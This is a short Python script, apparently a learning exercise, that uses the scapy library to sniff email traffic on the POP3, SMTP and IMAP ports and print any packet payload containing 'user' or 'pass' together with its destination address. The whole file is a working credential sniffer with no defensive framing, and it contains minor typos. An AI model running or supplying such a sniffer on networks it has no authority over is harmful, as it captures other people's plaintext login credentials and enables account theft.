from scapy.all import sniff, TCP, IP

def packet_callback(packet):
    if packet[TCP].payload:
        mypacket = str(packet[TCP].payload)
        if 'user' in mypacket.lower() or 'pass' in mypacket.lower():
            print(f"[*] Adress out: {packet[IP].dst}")
            print(f"[*] {str(packet[TCP].payload)}")
    print(packet.show())

def main():
    '''filter email ports:
    POP3 at port 110
    IMAP at port 143
    SMTO at port 25'''
    sniff(filter='tcp port 110 or tcp port 25 or tcp port 143', prn=packet_callback, count = 1)

if __name__ == '__main__':
    main()
